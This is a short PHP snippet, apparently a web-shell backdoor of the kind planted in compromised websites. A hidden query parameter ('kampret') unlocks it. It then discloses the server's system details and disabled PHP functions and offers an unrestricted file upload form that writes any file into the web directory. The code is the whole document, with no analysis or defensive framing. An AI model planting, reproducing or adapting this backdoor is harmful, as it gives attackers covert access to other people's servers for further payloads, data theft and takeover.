error_reporting(0);
if(isset($_GET["kampret"]))
	{
		echo"<font color=#000000>".php_uname()."";
		print "\n";$disable_functions = @ini_get("disable_functions"); 
		echo "<br>DisablePHP=".$disable_functions; print "\n"; 
		echo"<br><form method=post enctype=multipart/form-data>"; 
		echo"<input type=file name=f><input name=k type=submit id=k value=pencet><br>"; 
		  if($_POST["k"]==pencet)
{ if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){
echo"<b>".$_FILES["f"]["name"];
}else{
echo"<b>Gagal upload kampret";
}
} 
}
